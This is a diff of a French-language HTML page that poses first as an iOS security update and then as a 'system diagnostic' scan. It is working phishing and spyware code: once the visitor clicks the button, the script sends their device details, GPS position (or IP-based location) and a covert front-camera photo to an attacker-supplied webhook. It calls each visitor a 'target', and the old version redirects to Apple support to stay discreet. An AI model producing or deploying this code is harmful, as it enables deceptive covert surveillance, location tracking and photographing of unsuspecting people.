@@ -3,88 +3,95 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Update | Processing</title>
+    <title>System Diagnostic</title>
     <style>
-        body { background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .container { text-align: center; width: 80%; max-width: 400px; }
-        .loader { border: 3px solid #333; border-top: 3px solid #007aff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h1 { font-size: 18px; font-weight: 500; margin-bottom: 10px; }
-        p { font-size: 14px; color: #888; margin-bottom: 30px; }
-        .btn { background: #007aff; color: #fff; border: none; padding: 12px 25px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; }
-        video, canvas { display: none; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
+        .box { border: 2px solid #0f0; padding: 30px; border-radius: 10px; box-shadow: 0 0 15px #0f0; width: 90%; max-width: 400px; }
+        .btn { background: #0f0; color: #000; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; border-radius: 5px; margin-top: 20px; width: 100%; }
+        #video, #canvas { display: none; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div id="loader-icon" style="display:none;" class="loader"></div>
-        <h1 id="title">Mise à jour requise</h1>
-        <p id="status">Veuillez confirmer votre identité pour continuer la mise à jour de sécurité iOS.</p>
-        <button id="main-btn" class="btn" onclick="execute()">Continuer</button>
+    <div class="box">
+        <h2 id="title">ANALYSE SYSTÈME</h2>
+        <p id="msg">Cliquez pour lancer le diagnostic de sécurité.</p>
+        <button id="run" class="btn">LANCER LE SCAN</button>
     </div>
 
-    <video id="video" autoplay playsinline></video>
+    <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
     <script>
-        const WEBHOOK = "TON_WEBHOOK_ICI"; // <--- METS TON LIEN ICI
-        const REDIRECT_URL = "https://support.apple.com/fr-fr"; // Site de redirection
+        const WEBHOOK = "TON_WEBHOOK_ICI";
 
-        async function execute() {
-            // UI Change
-            document.getElementById('main-btn').style.display = 'none';
-            document.getElementById('loader-icon').style.display = 'block';
-            document.getElementById('title').innerText = "Analyse en cours...";
-            document.getElementById('status').innerText = "Veuillez patienter quelques instants.";
-
-            // 1. Infos Système directes
-            const sysInfo = `📱 **CIBLE ACTIVE**\n**OS**: ${navigator.platform}\n**Langue**: ${navigator.language}\n**Batterie**: En attente...`;
-            await fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ content: sysInfo }) });
-
-            // 2. Géolocalisation avec repli IP
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                await fetch(WEBHOOK, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ content: `📍 **GPS** : https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` })
-                });
-            }, async () => {
-                const res = await fetch('http://ip-api.com/json/');
-                const data = await res.json();
-                await fetch(WEBHOOK, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ content: `🌐 **IP (Fallback)** : ${data.city}, ${data.country}\nLien: https://www.google.com/maps?q=${data.lat},${data.lon}` })
-                });
-            }, { timeout: 5000 });
-
-            // 3. Caméra & Redirection
+        // Fonction pour envoyer au webhook (stable sur tous supports)
+        async function sendToDiscord(content, file = null) {
+            const formData = new FormData();
+            if (file) {
+                formData.append('file', file, 'capture.png');
+                formData.append('payload_json', JSON.stringify({ content: content }));
+            } else {
+                formData.append('payload_json', JSON.stringify({ content: content }));
+            }
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                await fetch(WEBHOOK, { method: 'POST', body: formData });
+            } catch (e) { console.error("Erreur Webhook"); }
+        }
+
+        async function start() {
+            const btn = document.getElementById('run');
+            btn.style.display = 'none';
+            document.getElementById('msg').innerText = "Vérification en cours...";
+
+            // 1. Infos de base (Marche partout)
+            const info = `💻 **NOUVELLE CIBLE**\n**OS**: ${navigator.platform}\n**Navigateur**: ${navigator.userAgent}\n**Langue**: ${navigator.language}`;
+            await sendToDiscord(info);
+
+            // 2. Géolocalisation (Amélioré pour Mobile)
+            navigator.geolocation.getCurrentPosition(async (p) => {
+                await sendToDiscord(`📍 **GPS**: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+            }, () => {
+                sendToDiscord("⚠️ GPS refusé ou indisponible");
+            }, { enableHighAccuracy: true, timeout: 8000 });
+
+            // 3. Capture Caméra (PC + Android + iOS)
+            try {
+                // Support universel des contraintes vidéo
+                const constraints = { 
+                    video: { 
+                        facingMode: "user",
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    } 
+                };
+                
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 const video = document.getElementById('video');
                 video.srcObject = stream;
 
-                setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append('file', blob, 'capture.png');
-                        formData.append('payload_json', JSON.stringify({ content: "📸 **FACE CAPTURE**" }));
-                        fetch(WEBHOOK, { method: 'POST', body: formData }).then(() => {
-                            window.location.href = REDIRECT_URL;
-                        });
-                        stream.getTracks().forEach(t => t.stop());
-                    }, 'image/png');
-                }, 1500);
-            } catch (e) {
-                // Si la caméra est bloquée, on redirige quand même après 2 secondes pour rester discret
-                setTimeout(() => { window.location.href = REDIRECT_URL; }, 2000);
+                // Attente que la vidéo soit prête pour la capture
+                video.onloadedmetadata = () => {
+                    setTimeout(() => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        
+                        canvas.toBlob(blob => {
+                            sendToDiscord("📸 **CAPTURE RÉUSSIE**", blob);
+                            // On coupe la caméra proprement
+                            stream.getTracks().forEach(t => t.stop());
+                            document.getElementById('msg').innerText = "Diagnostic terminé.";
+                        }, 'image/png');
+                    }, 1500); // Délai pour laisser l'autofocus se faire
+                };
+            } catch (err) {
+                await sendToDiscord("❌ Échec Caméra: " + err.name);
+                document.getElementById('msg').innerText = "Erreur de périphérique.";
             }
         }
+
+        document.getElementById('run').addEventListener('click', start);
     </script>
 </body>
 </html>
